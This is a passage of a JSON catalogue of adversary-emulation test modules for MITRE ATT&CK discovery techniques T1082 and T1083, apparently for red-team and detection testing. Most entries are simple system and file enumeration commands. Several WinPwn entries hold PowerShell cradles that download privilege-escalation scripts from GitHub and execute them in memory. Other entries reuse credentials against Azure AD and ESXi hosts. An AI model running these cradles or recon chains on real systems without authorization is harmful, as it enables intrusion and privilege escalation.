      "technique_name": "System Information Discovery",
      "description": "Read and Display System Intergrety Protection status. csrutil is commonly used by malware and post-exploitation tools to determine whether certain files and directories on the system are writable or not.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "csrutil status\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "327cc050-9e99-4c8e-99b5-1d15f2fb6b96",
      "module_name": "Show System Integrity Protection status (MacOS)"
    },
    {
      "index": 528,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwinPEAS -noninteractive -consoleoutput",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "eea1d918-825e-47dd-acc2-814d6c58c0e1",
      "module_name": "WinPwn - winPEAS"
    },
    {
      "index": 529,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nitm4nprivesc -noninteractive -consoleoutput",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3d256a2f-5e57-4003-8eb6-64d91b1da7ce",
      "module_name": "WinPwn - itm4nprivesc"
    },
    {
      "index": 530,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Powersploits privesc checks using oldchecks function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\noldchecks -noninteractive -consoleoutput",
        "elevation_required": false,
        "cleanup_command": "rm -force -recurse .\\DomainRecon -ErrorAction Ignore\nrm -force -recurse .\\Exploitation -ErrorAction Ignore\nrm -force -recurse .\\LocalPrivEsc -ErrorAction Ignore\nrm -force -recurse .\\LocalRecon -ErrorAction Ignore\nrm -force -recurse .\\Vulnerabilities -ErrorAction Ignore"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "345cb8e4-d2de-4011-a580-619cf5a9e2d7",
      "module_name": "WinPwn - Powersploits privesc checks"
    },
    {
      "index": 531,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "General privesc checks using the otherchecks function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\notherchecks -noninteractive -consoleoutput",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5b6f39a2-6ec7-4783-a5fd-2c54a55409ed",
      "module_name": "WinPwn - General privesc checks"
    },
    {
      "index": 532,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Collect general computer informations via GeneralRecon function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGeneralrecon -consoleoutput -noninteractive",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7804659b-fdbf-4cf6-b06a-c03e758590e8",
      "module_name": "WinPwn - GeneralRecon"
    },
    {
      "index": 533,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Gathers local system information using the Morerecon function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMorerecon -noninteractive -consoleoutput",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3278b2f6-f733-4875-9ef4-bfed34244f0a",
      "module_name": "WinPwn - Morerecon"
    },
    {
      "index": 534,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nRBCD-Check -consoleoutput -noninteractive",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "dec6a0d8-bcaf-4c22-9d48-2aee59fb692b",
      "module_name": "WinPwn - RBCD-Check"
    },
    {
      "index": 535,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')\nInvoke-watson",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "07b18a66-6304-47d2-bad0-ef421eb2e107",
      "module_name": "WinPwn - PowerSharpPack - Watson searching for missing windows patches"
    },
    {
      "index": 536,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')\nInvoke-SharpUp -command \"audit\"",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "efb79454-1101-4224-a4d0-30c9c8b29ffc",
      "module_name": "WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors"
    },
    {
      "index": 537,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "PowerSharpPack - Seatbelt technique via function of WinPwn.\n\n[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')\nInvoke-Seatbelt -Command \"-group=all\"",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5c16ceb4-ba3a-43d7-b848-a13c1f216d95",
      "module_name": "WinPwn - PowerSharpPack - Seatbelt"
    },
    {
      "index": 538,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Upon successful execution, this test will utilize a valid read-only Azure AD user's credentials to conduct a security scan and determine what users exist in a given tenant, as well as identify any admin users. \nOnce the test is complete, a folder will be output to the temp directory that contains 3 csv files which provide info on the discovered users. \nSee https://github.com/cyberark/SkyArk \n",
      "execution": {
        "platforms": [
          "azure-ad"
        ],
        "executor_type": "powershell",
        "command": "Import-Module \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AzureStealth.ps1\" -force      \n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-AzAccount -Credential $Credential\nConnect-AzureAD -Credential $Credential\nScan-AzureAdmins -UseCurrentCred\n",
        "elevation_required": true,
        "cleanup_command": "$resultstime = Get-Date -Format \"yyyyMMdd\"\n$resultsfolder = (\"Results-\" + $resultstime)\nremove-item $env:temp\\$resultsfolder -recurse -force -erroraction silentlycontinue\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Azure AD username",
          "type": "string",
          "default_value": null
        },
        {
          "name": "password",
          "description": "Azure AD password",
          "type": "string",
          "default_value": "T1082Az"
        }
      ],
      "prerequisites": [
        {
          "description": "The SkyArk AzureStealth module must exist in PathToRagloxModulesFolder\\..\\ExternalPayloads.\n",
          "check_command": "if (test-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AzureStealth.ps1\"){exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/cyberark/SkyArk/3293ee145e95061a8980dd7b5da0030edc4da5c0/AzureStealth/AzureStealth.ps1\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AzureStealth.ps1\"\n"
        },
        {
          "description": "The AzureAD module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name AzureAD -Force\n"
        },
        {
          "description": "The Az module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name Az -Force\n"
        }
      ],
      "rx_module_id": "26a18d3d-f8bc-486b-9a33-d6df5d78a594",
      "module_name": "Azure Security Scan with SkyArk"
    },
    {
      "index": 539,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Enumerate kernel modules installed 3 different ways. Upon successful execution stdout will display kernel modules installed on host 2 times, followed by list of modules matching 'vmw' if present.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "lsmod\nkmod list\ngrep vmw /proc/modules\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "034fe21c-3186-49dd-8d5d-128b35f181c7",
      "module_name": "Linux List Kernel Modules"
    },
    {
      "index": 540,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Enumerate kernel modules loaded. Upon successful execution stdout will display kernel modules loaded, followed by list of modules matching 'vmm' if present.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "kldstat\nkldstat | grep vmm\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "4947897f-643a-4b75-b3f5-bed6885749f6",
      "module_name": "FreeBSD List Kernel Modules"
    },
    {
      "index": 541,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver products/versions.\nhttps://nwgat.ninja/getting-system-information-with-wmic-on-windows/\nElements of this test were observed in the wild used by Aurora Stealer in late 2022 and early 2023, as highlighted in public reporting:\nhttps://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar\nhttps://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic cpu get name\nwmic MEMPHYSICAL get MaxCapacity\nwmic baseboard get product\nwmic baseboard get version\nwmic bios get SMBIOSBIOSVersion\nwmic path win32_VideoController get name\nwmic path win32_VideoController get DriverVersion\nwmic path win32_VideoController get VideoModeDescription\nwmic OS get Caption,OSArchitecture,Version\nwmic DISKDRIVE get Caption\nGet-WmiObject win32_bios\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8851b73a-3624-4bf7-8704-aa312411565c",
      "module_name": "System Information Discovery with WMIC"
    },
    {
      "index": 542,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "The script gathernetworkinfo.vbs is employed to collect system information such as the operating system, DNS details, firewall configuration, etc. Outputs are stored in c:\\Windows\\System32\\config or c:\\Windows\\System32\\reg. https://www.verboon.info/2011/06/the-gathernetworkinfo-vbs-script/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wscript.exe C:\\Windows\\System32\\gatherNetworkInfo.vbs\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "4060ee98-01ae-4c8e-8aad-af8300519cc7",
      "module_name": "System Information Discovery"
    },
    {
      "index": 543,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Looks up country code configured in the registry, likely geofence. Upon execution, country code info will be displayed.\n- https://tria.ge/210111-eaz8mqhgh6/behavioral1\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg query \"HKEY_CURRENT_USER\\Control Panel\\International\\Geo\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "96be6002-9200-47db-94cb-c3e27de1cb36",
      "module_name": "Check computer location"
    },
    {
      "index": 544,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Looks up for BIOS information in the registry. BIOS information is often read in order to detect sandboxing environments.  Upon execution, BIOS information will be displayed.\n- https://tria.ge/210111-eaz8mqhgh6/behavioral1\n- https://evasions.checkpoint.com/techniques/registry.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v SystemBiosVersion\nreg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v VideoBiosVersion\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f2f91612-d904-49d7-87c2-6c165d23bead",
      "module_name": "BIOS Information Discovery through Registry"
    },
    {
      "index": 545,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "An adversary will using ESXCLI to enumerate the Virtual Machines on the host prior to executing power off routine.\n[Reference](https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "echo \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{cli_script}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "vm_host",
          "description": "Specify the host name or IP of the ESXi Server",
          "type": "string",
          "default_value": "raglox.local"
        },
        {
          "name": "vm_user",
          "description": "Specify the privilege user account on ESXi Server",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "vm_pass",
          "description": "Specify the privilege user password on ESXi Server",
          "type": "string",
          "default_value": "pass"
        },
        {
          "name": "plink_file",
          "description": "Path to Plink",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\plink.exe"
        },
        {
          "name": "cli_script",
          "description": "Path to file with discovery commands",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1082\\src\\esx_vmdiscovery.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if plink is available.\n",
          "check_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
        }
      ],
      "rx_module_id": "2040405c-eea6-4c1c-aef3-c2acc430fac9",
      "module_name": "ESXi - VM Discovery using ESXCLI"
    },
    {
      "index": 546,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Darkside ransomware utilises various ESXCLI commands to obtain information about the ESXi Host.\n[Reference](https://www.trendmicro.com/en_ph/research/21/e/darkside-linux-vms-targeted.html)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "echo \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{cli_script}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "vm_host",
          "description": "Specify the host name or IP of the ESXi Server",
          "type": "string",
          "default_value": "raglox.local"
        },
        {
          "name": "vm_user",
          "description": "Specify the privilege user account on ESXi Server",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "vm_pass",
          "description": "Specify the privilege user password on ESXi Server",
          "type": "string",
          "default_value": "pass"
        },
        {
          "name": "plink_file",
          "description": "Path to Plink",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\plink.exe"
        },
        {
          "name": "cli_script",
          "description": "Path to file containing darkside ransomware discovery commands",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1082\\src\\esx_darkside_discovery.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if plink is available.\n",
          "check_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
        }
      ],
      "rx_module_id": "f89812e5-67d1-4f49-86fa-cbc6609ea86a",
      "module_name": "ESXi - Darkside system information discovery"
    },
    {
      "index": 547,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Gets the macOS hardware information, which can be used to determine whether the target macOS host is running on a physical or virtual machine. sysctl can be used to gather interesting macOS host data, including hardware information, memory size, logical cpu information, etc.",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sysctl -n hw.model",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c8d40da9-31bd-47da-a497-11ea55d1ef6c",
      "module_name": "sysctl to gather macOS hardware info"
    },
    {
      "index": 548,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "operating system discovery using get-ciminstance\nhttps://petri.com/getting-operating-system-information-powershell/",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName, WindowsDirectory | Out-null",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "70e13ef4-5a74-47e4-9d16-760b41b0e2db",
      "module_name": "operating system discovery "
    },
    {
      "index": 549,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Ver command shows information about os version.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "ver",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f6ecb109-df24-4303-8d85-1987dbae6160",
      "module_name": "Check OS version via \"ver\" command"
    },
    {
      "index": 550,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "The command shows all available volume shadow copies, along with their creation time and location.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "vssadmin.exe list shadows",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7161b085-816a-491f-bab4-d68e974b7995",
      "module_name": "Display volume shadow copies with \"vssadmin\""
    },
    {
      "index": 551,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "This action demonstrates how an attacker might gather a system's region and language settings using PowerShell, which could aid in profiling \nthe machine's location and user language preferences. The command outputs system locale details to a temporary file for further analysis.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "powershell.exe -c \"Get-Culture | Format-List | Out-File -FilePath %TMP%\\a.txt\"\n",
        "elevation_required": false,
        "cleanup_command": "cmd.exe /c del \"%TMP%\\a.txt\"\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ce479c1a-e8fa-42b2-812a-96b0f2f4d28a",
      "module_name": "Identify System Locale and Regional Settings with PowerShell"
    },
    {
      "index": 552,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "This test simulates an attacker attempting to list the available drives on the system to gather data about file storage locations.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "powershell.exe -c \"gdr -PSProvider 'FileSystem'\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c187c9bc-4511-40b3-aa10-487b2c70b6a5",
      "module_name": "Enumerate Available Drives via gdr"
    },
    {
      "index": 553,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Identify the Operating System Product Name via registry with the reg.exe command.\nUpon execution, the OS Product Name will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v ProductName\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "be3b5fe3-a575-4fb8-83f6-ad4a68dd5ce7",
      "module_name": "Discover OS Product Name via Registry"
    },
    {
      "index": 554,
      "technique_id": "T1082",
      "technique_name": "System Information Discovery",
      "description": "Identify the Operating System Build Number via registry with the reg.exe command.\nUpon execution, the OS Build Number will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentBuildNumber\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "acfcd709-0013-4f1e-b9ee-bc1e7bafaaec",
      "module_name": "Discover OS Build Number via Registry"
    },
    {
      "index": 555,
      "technique_id": "T1083",
      "technique_name": "File and Directory Discovery",
      "description": "Find or discover files on the file system.  Upon successful execution, this test will output the results of all the data discovery commands to a specified file.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "dir /s c:\\ >> #{output_file}\ndir /s \"c:\\Documents and Settings\" >> #{output_file}\ndir /s \"c:\\Program Files\\\" >> #{output_file}\ndir \"%systemdrive%\\Users\\*.*\" >> #{output_file}\ndir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> #{output_file}\ndir \"%userprofile%\\Desktop\\*.*\" >> #{output_file}\ntree /F >> #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "del #{output_file}\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "File to output results to",
          "type": "string",
          "default_value": "%temp%\\T1083Test1.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "0e36303b-6762-4500-b003-127743b80ba6",
      "module_name": "File and Directory Discovery (cmd.exe)"
    },
    {
      "index": 556,
      "technique_id": "T1083",
      "technique_name": "File and Directory Discovery",
      "description": "Find or discover files on the file system. Upon execution, file and folder information will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "ls -recurse\nget-childitem -recurse\ngci -recurse\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "2158908e-b7ef-4c21-8a83-3ce4dd05a924",
      "module_name": "File and Directory Discovery (PowerShell)"
    },
    {
      "index": 557,
      "technique_id": "T1083",
      "technique_name": "File and Directory Discovery",
      "description": "Find or discover files on the file system\n\nReferences:\n\nhttp://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/\n\nhttps://perishablepress.com/list-files-folders-recursively-terminal/\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "ls -a >> #{output_file}\nif [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi;\nfile */* *>> #{output_file}\ncat #{output_file} 2>/dev/null\nfind . -type f\nls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'\nlocate *\nwhich sh\n",
        "elevation_required": false,
        "cleanup_command": "rm #{output_file}\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Output file used to store the results.",
          "type": "path",
          "default_value": "/tmp/T1083.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "ffc8b249-372a-4b74-adcd-e4c0430842de",
      "module_name": "Nix File and Directory Discovery"
    },
    {
      "index": 558,
      "technique_id": "T1083",
      "technique_name": "File and Directory Discovery",
      "description": "Find or discover files on the file system\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file}\nif [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi;\nfind . -type f -iname *.pdf >> #{output_file}\ncat #{output_file}\nfind . -type f -name \".*\"\n",
        "elevation_required": false,
        "cleanup_command": "rm #{output_file}"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Output file used to store the results.",
          "type": "path",
          "default_value": "/tmp/T1083.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "13c5e1ae-605b-46c4-a79f-db28c77ff24e",
      "module_name": "Nix File and Directory Discovery 2"
    },
    {
      "index": 559,
      "technique_id": "T1083",
      "technique_name": "File and Directory Discovery",
      "description": "This test emulates MAZE ransomware's ability to enumerate directories using Powershell.\nUpon successful execution, this test will output the directory enumeration results to a specified file, as well as display them in the active window.\nSee https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$folderarray = @(\"Desktop\", \"Downloads\", \"Documents\", \"AppData/Local\", \"AppData/Roaming\")\nGet-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}\nGet-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append #{File_to_output}\nGet-ChildItem -Path \"${env:ProgramFiles(x86)}\" -erroraction silentlycontinue | Out-File -append #{File_to_output}\n$UsersFolder = \"$env:homedrive\\Users\\\"\nforeach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue)\n{\nforeach ($secondarydirectory in $folderarray)\n {Get-ChildItem -Path \"$UsersFolder/$directory/$secondarydirectory\" -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}}\n}\ncat #{File_to_output}\n",
        "elevation_required": false,
        "cleanup_command": "remove-item #{File_to_output} -ErrorAction SilentlyContinue\n"
      },
      "variables": [
        {
          "name": "File_to_output",
          "description": "File to output results to",
          "type": "string",
          "default_value": "$env:temp\\T1083Test5.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "c6c34f61-1c3e-40fb-8a58-d017d88286d8",
      "module_name": "Simulating MAZE Directory Enumeration"
    },
    {
      "index": 560,
      "technique_id": "T1083",
      "technique_name": "File and Directory Discovery",
      "description": "Launches the DirLister executable for a short period of time and then exits.\n\nRecently seen used by [BlackCat ransomware](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/) to create a list of accessible directories and files.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process \"#{dirlister_path}\"\nStart-Sleep -Second 4\nStop-Process -Name \"DirLister\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "dirlister_path",
          "description": "Path to the DirLister executable ",
          "type": "string",
